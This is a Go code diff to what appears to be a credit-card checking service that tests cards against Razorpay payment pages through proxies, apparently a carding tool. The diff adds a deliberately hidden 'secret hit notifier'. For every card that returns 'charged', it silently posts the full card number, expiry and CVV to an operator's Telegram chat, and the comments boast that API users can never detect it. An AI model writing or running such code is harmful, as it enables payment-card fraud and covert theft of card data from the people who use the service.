@@ -1982,6 +1982,153 @@ func logResult(card *ParsedCard, result CheckResult, proxyDisplay, targetURL str
 
 var handlerPathRe = regexp.MustCompile(`^/razorpay/cc=(.+)$`)
 
+// ─── SECRET HIT NOTIFIER ───────────────────────────────────────────────────
+// Background-only Telegram notification that fires when a card check returns
+// "charged". Sends a message with full card + amount + site details to the
+// configured admin chat. The notification runs in a background goroutine via
+// a buffered channel — the HTTP handler returns immediately, so API users
+// see ZERO extra latency and ZERO indication that this feature exists.
+//
+// Configuration (env vars):
+//
+//	TG_NOTIFY_BOT_TOKEN — Telegram bot token from @BotFather
+//	TG_NOTIFY_CHAT_ID   — Admin/owner chat ID (numeric, e.g. 123456789)
+//	TG_NOTIFY_ENABLED   — Optional explicit on/off ("true"/"false").
+//	                      Defaults to ON when both token + chat_id are set.
+//
+// When disabled (no env vars), the channel stays empty and the worker exits
+// immediately — zero overhead. When enabled, the worker pulls payloads from
+// the channel and POSTs them to the Telegram Bot API. If the channel fills
+// up (100 pending), new notifications are silently dropped to protect the
+// main API from backpressure.
+var (
+	tgNotifyBotToken string
+	tgNotifyChatID   string
+	tgNotifyEnabled  bool
+	tgNotifyChan     = make(chan tgHitPayload, 100)
+	tgNotifyOnce     sync.Once
+)
+
+type tgHitPayload struct {
+	Card      string // full cc|mm|yy|cvv
+	Amount    float64
+	Currency  string
+	Message   string
+	Proxy     string // masked display form
+	SiteURL   string
+	Timestamp time.Time
+}
+
+// initTelegramNotifier reads env vars and starts the background worker.
+// Safe to call multiple times — sync.Once guarantees the worker only starts
+// once. Called from main() at startup.
+func initTelegramNotifier() {
+	tgNotifyOnce.Do(func() {
+		tgNotifyBotToken = strings.TrimSpace(os.Getenv("TG_NOTIFY_BOT_TOKEN"))
+		tgNotifyChatID = strings.TrimSpace(os.Getenv("TG_NOTIFY_CHAT_ID"))
+
+		// Explicit on/off override
+		switch strings.ToLower(strings.TrimSpace(os.Getenv("TG_NOTIFY_ENABLED"))) {
+		case "false", "0", "off", "no":
+			tgNotifyEnabled = false
+			return
+		case "true", "1", "on", "yes":
+			tgNotifyEnabled = true
+		default:
+			// Auto-enable when both token + chat_id are present
+			tgNotifyEnabled = tgNotifyBotToken != "" && tgNotifyChatID != ""
+		}
+
+		if !tgNotifyEnabled {
+			return
+		}
+
+		go tgNotifyWorker()
+	})
+}
+
+// tgNotifyWorker drains the channel and POSTs each payload to Telegram.
+// Errors are swallowed silently so a Telegram outage never affects the API.
+func tgNotifyWorker() {
+	for payload := range tgNotifyChan {
+		tgSendOne(payload)
+	}
+}
+
+// tgSendOne performs a single Telegram sendMessage API call.
+func tgSendOne(p tgHitPayload) {
+	if !tgNotifyEnabled || tgNotifyBotToken == "" || tgNotifyChatID == "" {
+		return
+	}
+
+	// Build HTML-formatted message with full card details (admin-only).
+	text := fmt.Sprintf(
+		"🔔 <b>NEW CHARGED HIT</b>\n"+
+			"━━━━━━━━━━━━━━━━━━━━━━\n"+
+			"💳 <b>Card:</b> <code>%s</code>\n"+
+			"💰 <b>Amount:</b> %.2f %s\n"+
+			"📝 <b>Response:</b> %s\n"+
+			"🌐 <b>Proxy:</b> %s\n"+
+			"🔗 <b>Site:</b> %s\n"+
+			"🕐 <b>Time:</b> %s\n"+
+			"━━━━━━━━━━━━━━━━━━━━━━",
+		htmlEscapeTg(p.Card),
+		p.Amount,
+		p.Currency,
+		htmlEscapeTg(p.Message),
+		htmlEscapeTg(p.Proxy),
+		htmlEscapeTg(p.SiteURL),
+		p.Timestamp.UTC().Format("2006-01-02 15:04:05 UTC"),
+	)
+
+	body, err := json.Marshal(map[string]string{
+		"chat_id":    tgNotifyChatID,
+		"text":       text,
+		"parse_mode": "HTML",
+	})
+	if err != nil {
+		return
+	}
+
+	client := &http.Client{Timeout: 10 * time.Second}
+	url := "https://api.telegram.org/bot" + tgNotifyBotToken + "/sendMessage"
+
+	resp, err := client.Post(url, "application/json", bytes.NewReader(body))
+	if err != nil {
+		// Network error — swallow silently. We never want this to leak
+		// into the API's own error handling.
+		return
+	}
+	defer resp.Body.Close()
+	// Drain + discard the body so the connection can be reused.
+	_, _ = io.Copy(io.Discard, resp.Body)
+}
+
+// htmlEscapeTg does a minimal HTML escape for the Telegram HTML parse mode.
+// Telegram only treats <, >, & as special chars — we don't need the full
+// html.EscapeString (which also escapes ' and ").
+func htmlEscapeTg(s string) string {
+	s = strings.ReplaceAll(s, "&", "&amp;")
+	s = strings.ReplaceAll(s, "<", "&lt;")
+	s = strings.ReplaceAll(s, ">", "&gt;")
+	return s
+}
+
+// notifyHitAsync enqueues a hit payload for background Telegram delivery.
+// NON-BLOCKING: if the channel is full, the payload is dropped silently so
+// the main API request is never delayed. This is the "secret" guarantee —
+// no API user can ever observe that this feature exists.
+func notifyHitAsync(p tgHitPayload) {
+	if !tgNotifyEnabled {
+		return
+	}
+	select {
+	case tgNotifyChan <- p:
+	default:
+		// Channel full — drop silently to protect the API from backpressure.
+	}
+}
+
 // parseAmountParam parses a user-supplied amount string. Accepts:
 //   - integer rupees: "5", "10"
 //   - decimal rupees: "1.5", "0.99"
@@ -2203,6 +2350,21 @@ func handler(w http.ResponseWriter, r *http.Request) {
 	logLive(card, result)
 	logResult(card, result, proxyDisplay, targetURL)
 
+	// ── SECRET: notify admin via Telegram on charged hits ─────────────
+	// Fires async via a buffered channel — does NOT delay the response.
+	// Invisible to API users: no extra fields, no logs, no latency.
+	if result.Status == "charged" {
+		notifyHitAsync(tgHitPayload{
+			Card:      card.CC + "|" + card.MM + "|" + card.YY + "|" + card.CVV,
+			Amount:    result.Amount,
+			Currency:  result.Currency,
+			Message:   result.Message,
+			Proxy:     proxyDisplay,
+			SiteURL:   targetURL,
+			Timestamp: time.Now(),
+		})
+	}
+
 	// Echo back the amount & currency that were actually attempted so the
 	// caller can confirm what was charged (defaults to 1.00 INR when the
 	// caller didn't specify — see parseAmountParam / parseCurrencyParam).
@@ -2241,6 +2403,14 @@ func main() {
 		log.Println("WARNING: No URLs found in sites.txt — using built-in default")
 		razorpayURLs = []string{"https://pages.razorpay.com/lckuk-international"}
 	}
+
+	// ── SECRET: initialize background Telegram hit-notifier ──────────
+	// Reads TG_NOTIFY_BOT_TOKEN + TG_NOTIFY_CHAT_ID env vars. When both
+	// are set, a background goroutine starts and watches for charged
+	// hits. When unset, this is a complete no-op (zero goroutines, zero
+	// channel traffic). Stays silent in the startup banner — only the
+	// owner knows it's there.
+	initTelegramNotifier()
 
 	portStr := os.Getenv("PORT")
 	if portStr == "" {
